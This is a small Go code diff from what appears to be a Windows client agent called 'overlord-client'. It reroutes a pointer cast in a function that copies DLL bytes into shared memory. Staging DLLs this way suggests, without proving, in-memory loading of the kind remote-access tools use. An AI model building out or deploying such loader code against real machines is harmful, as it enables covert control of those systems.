@@ -16,6 +16,8 @@ import (
 	"unicode/utf16"
 	"unsafe"
 
+	"overlord-client/cmd/agent/wininterop"
+
 	"golang.org/x/sys/windows"
 )
 
@@ -1125,7 +1127,7 @@ func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err er
 		return 0, "", fmt.Errorf("MapViewOfFile: %v", callErr)
 	}
 
-	copy(unsafe.Slice((*byte)(unsafe.Pointer(view)), size), dllBytes)
+	copy(unsafe.Slice((*byte)(wininterop.Pointer(view)), size), dllBytes)
 
 	procUnmapViewOfFile.Call(view)
 	return handle, name, nil
